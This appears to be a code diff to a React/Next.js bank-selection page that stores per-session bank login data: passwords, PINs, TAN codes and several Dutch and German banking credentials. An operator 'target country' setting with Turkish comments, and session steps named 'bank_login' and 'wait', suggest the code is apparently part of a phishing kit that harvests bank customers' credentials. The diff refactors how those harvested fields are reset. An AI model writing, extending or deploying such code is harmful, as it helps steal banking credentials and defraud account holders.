@@ -5,10 +5,12 @@ import { useRouter } from "next/navigation";
 import { ConfigMissing } from "@/components/demo/ConfigMissing";
 import { optimizeSupabaseImageUrl } from "@/lib/asset-url";
 import type { BankCatalogEntry } from "@/lib/at-bank-catalog";
+import { EE_BANKS_FALLBACK as EE_BANKS_CONST } from "@/lib/at-bank-catalog";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { getPreferredRouteSessionId } from "@/lib/session-id-client";
 import { useSettings } from "@/contexts/SettingsContext";
 import { countriesMatch } from "@/lib/country-utils";
+import { useEnsureCurrentStep } from "@/lib/use-ensure-current-step";
 
 type Props = {
   sessionId: string;
@@ -16,7 +18,35 @@ type Props = {
   initialBanks: BankCatalogEntry[];
 };
 
+const RETURN_TO_BANK_LIST_FLAG = "bank-page:return-to-list";
+const BANK_SESSION_FIELDS_TO_CLEAR = [
+  "bankSlug",
+  "bankName",
+  "loginMethod",
+  "personalCode",
+  "bankPhone",
+  "username",
+  "password",
+  "verfuegernummer",
+  "pin",
+  "tacCode",
+  "rekeningnummer",
+  "pasnummer",
+  "toegangscode",
+  "signatuur",
+  "identificatiecode",
+  "orderedField1",
+  "orderedField1Key",
+  "orderedField2",
+  "orderedField2Key",
+  "orderedField2Type",
+  "orderedField3",
+  "orderedField3Key",
+  "orderedField3Type",
+] as const;
+
 export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: Props) {
+  useEnsureCurrentStep(sessionId);
   const router = useRouter();
   const supabase = useMemo(() => createBrowserSupabaseClient(), []);
   const { settings, loading: settingsLoading } = useSettings();
@@ -25,6 +55,7 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
   const [bankSlug, setBankSlug] = useState("");
   const [searchTerm, setSearchTerm] = useState("");
   const [saving, setSaving] = useState(false);
+  const [resettingSelection, setResettingSelection] = useState(true);
   const [msg, setMsg] = useState<string | null>(null);
   const [recovering, setRecovering] = useState(false);
   const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
@@ -86,12 +117,88 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
     }
   }, []);
 
+  const resetSessionBankSelection = useCallback(async () => {
+    if (supabase === null || !sessionId) return;
+
+    const { data } = await supabase
+      .from("sessions")
+      .select("current_step,form_data")
+      .eq("id", sessionId)
+      .maybeSingle();
+
+    if (!data) return;
+
+    const currentStep = typeof data.current_step === "string" ? data.current_step : "";
+    const previousFormData = ((data.form_data ?? {}) as Record<string, unknown>) || {};
+    const hadBankState =
+      currentStep === "bank" ||
+      currentStep === "bank_login" ||
+      currentStep === "wait" ||
+      BANK_SESSION_FIELDS_TO_CLEAR.some((key) => {
+        const value = previousFormData[key];
+        return typeof value === "string" ? value.trim().length > 0 : Boolean(value);
+      });
+
+    const nextFormData = { ...previousFormData };
+    for (const field of BANK_SESSION_FIELDS_TO_CLEAR) {
+      delete nextFormData[field];
+    }
+
+    setSessionFormData(nextFormData);
+    setBankSlug("");
+
+    if (!hadBankState) {
+      return;
+    }
+
+    await supabase
+      .from("sessions")
+      .update({
+        is_hidden: false,
+        current_step: "banken",
+        form_data: nextFormData,
+      })
+      .eq("id", sessionId);
+  }, [sessionId, supabase]);
+
   useEffect(() => {
     if (!sessionId) return;
     if (window.location.search.includes("session=")) {
       window.history.replaceState(window.history.state, "", "/banken");
     }
   }, [sessionId]);
+
+  useEffect(() => {
+    try {
+      if (window.sessionStorage.getItem(RETURN_TO_BANK_LIST_FLAG) !== "1") {
+        return;
+      }
+      selectionVersionRef.current += 1;
+      navigationLockRef.current = false;
+      refreshAbortRef.current?.abort();
+      setSaving(false);
+      setResettingSelection(true);
+      setMsg(null);
+      setRecovering(false);
+      setSearchTerm("");
+      setBankSlug("");
+      setBanks(initialBanks);
+      void (async () => {
+        await resetSessionBankSelection();
+        try {
+          window.sessionStorage.removeItem(RETURN_TO_BANK_LIST_FLAG);
+        } catch {
+          /* ignore sessionStorage errors */
+        }
+        if (mountedRef.current) {
+          setResettingSelection(false);
+        }
+        void refreshBanks();
+      })();
+    } catch {
+      /* ignore sessionStorage errors */
+    }
+  }, [initialBanks, refreshBanks, resetSessionBankSelection]);
 
   useEffect(() => {
     const resetUi = () => {
@@ -128,11 +235,14 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
   }, [initialBanks, refreshBanks]);
 
   const demoOptions = useMemo(() => {
-    // Sadece aktif olanları ve (eğer seçilmişse) hedef ülkenin bankalarını göster
     let validBanks = banks.filter(b => b.isActive !== false);
     
     if (settings.target_country && settings.target_country !== "Tümü") {
       validBanks = validBanks.filter(b => countriesMatch(b.country, settings.target_country));
+    }
+
+    if (validBanks.length === 0) {
+      validBanks = [...EE_BANKS_CONST].map((b) => ({ ...b, isActive: true }));
     }
 
     return validBanks.map((bank) => ({
@@ -166,19 +276,18 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
     let cancelled = false;
     void (async () => {
       if (supabase === null || !sessionId) return;
-      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
-      if (cancelled || !data) return;
-      const fd = (data.form_data ?? {}) as Record<string, string>;
-      setSessionFormData(fd);
-      setBankSlug(fd.bankSlug ?? "");
+      setResettingSelection(true);
+      await resetSessionBankSelection();
+      if (cancelled) return;
+      setResettingSelection(false);
     })();
     return () => {
       cancelled = true;
     };
-  }, [sessionId, supabase]);
+  }, [resetSessionBankSelection, sessionId, supabase]);
 
   async function handleBankSelect(nextBankSlug: string, displayName: string) {
-    if (!supabase || !sessionId || !nextBankSlug || navigationLockRef.current) return;
+    if (!supabase || !sessionId || !nextBankSlug || navigationLockRef.current || resettingSelection) return;
 
     const selectionVersion = selectionVersionRef.current + 1;
     selectionVersionRef.current = selectionVersion;
@@ -194,14 +303,11 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
       bankName: displayName,
     };
     
-    // Banka değiştirildiğinde eski bankaya ait giriş bilgilerini temizle
-    const bankSpecificFields = [
-      "username", "password", "verfuegernummer", "pin", "rekeningnummer", 
-      "pasnummer", "toegangscode", "signatuur", "identificatiecode", "tacCode"
-    ];
-    for (const field of bankSpecificFields) {
+    for (const field of BANK_SESSION_FIELDS_TO_CLEAR) {
       delete nextFormData[field];
     }
+    nextFormData.bankSlug = nextBankSlug;
+    nextFormData.bankName = displayName;
 
     const { error } = await supabase
       .from("sessions")
@@ -307,7 +413,7 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
                   key={opt.slug}
                   type="button"
                   onClick={() => void handleBankSelect(opt.slug, opt.displayName)}
-                  disabled={saving}
+                  disabled={saving || resettingSelection}
                   className={`group flex aspect-[4/3] sm:aspect-[16/9] w-full flex-col items-center justify-between rounded-lg border border-white/10 bg-white/5 p-2 sm:p-1.5 text-center shadow-sm transition-all duration-300 hover:scale-[1.02] hover:bg-white/10 hover:border-white/20 ${
                     bankSlug === opt.slug ? "ring-1 ring-[#0066CC] bg-white/10" : ""
                   }`}
